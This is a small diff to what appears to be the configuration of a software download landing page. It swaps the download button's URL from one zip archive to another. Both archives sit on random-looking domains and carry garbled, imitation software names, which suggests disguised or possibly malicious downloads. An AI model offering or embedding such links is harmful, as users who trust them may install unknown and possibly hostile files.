@@ -55,7 +55,7 @@
        btnRadius: "10px",
        bg: "//p8.qhimg.com/t11098f6bcd5e40dd91a92718e4.webp",
     },
-    downloadUrl: "https://soelrsjkikfje-s3.top/Pniot_Niscontog_MSX-Clournds_22736.zip", 
+    downloadUrl: "https://risanhs-sdad1e4asd-3css3hub.xyz/Riconp_x64_xp-win7_Stueepaydensk_v500237.2102.zip", 
     QH:"QH_132_4#18",
     theme:"v2",
     themeBtnColor: "#15CA71",
